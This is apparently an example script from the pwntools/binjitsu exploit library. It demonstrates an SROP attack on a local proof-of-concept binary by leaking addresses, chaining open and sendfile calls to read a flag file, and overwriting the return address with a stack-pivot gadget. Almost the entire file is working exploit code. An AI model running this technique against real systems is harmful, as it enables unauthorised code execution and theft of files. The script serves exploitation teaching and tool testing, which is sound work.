#!/usr/bin/python

"""
A set of examples that demonstrate how to mount an SROP attack
using pwntools/binjitsu.
Example tested on :
   #Distributor ID:Ubuntu
   #Description:Ubuntu 13.10
   #Release:13.10
   #Codename:saucy
   #Linux z-VirtualBox 3.11.0-26-generic #45-Ubuntu SMP Tue Jul 15 04:04:15 UTC 2014 i686 i686 i686 GNU/Linux
"""

import os
import sys

from pwn import *

# Turn off all logging
context.log_level = 10000

"""
Example 2:
    Reading a flag and sending over data.
    The binary is not linked with libc.
    This example demonstrates srop-rop integration.
"""
def exploit_nasm(flagfile):
    r = ROP("poc-nasm")
    p = process("./poc-nasm")

    function_address = p.unpack()
    buffer_address   = p.unpack() - 4
    POP_ESP_RET      = function_address + 0

    # At the top of the payload, you have the name of the
    # flagfile
    sploit  = "%s\0" % flagfile

    # Now we have the ropchains
    r.open(buffer_address, 0, 0)

    # The following call switches to SROP automatically
    r.sendfile(constants.STDOUT_FILENO, 3, 0, 100)

    # Append what we have to sploit
    sploit += str(r)

    #
    # ESP: 0xbffffbd0 ("qaacraacsaactaacuaacvaacwaacxaacyaac\n\375\377\277")
    # EIP: 0x63616170 ('paac')
    # [-------------------------------------code-------------------------------------]
    # Invalid $PC address: 0x63616170
    eip_offset = cyclic_find('paac')

    sploit += "A" * (eip_offset - len(sploit))

    # Overwrite the return address and set the ESP to the start
    # of the ropchain(i.e. where we have the call to `open`).
    sploit += pack(POP_ESP_RET)
    sploit += pack(buffer_address+len(flagfile)+1)

    p.send(sploit)
    flag = p.recvline()
    return flag

# Second example
flag = exploit_nasm(args['FLAG'])
print b64e(flag)
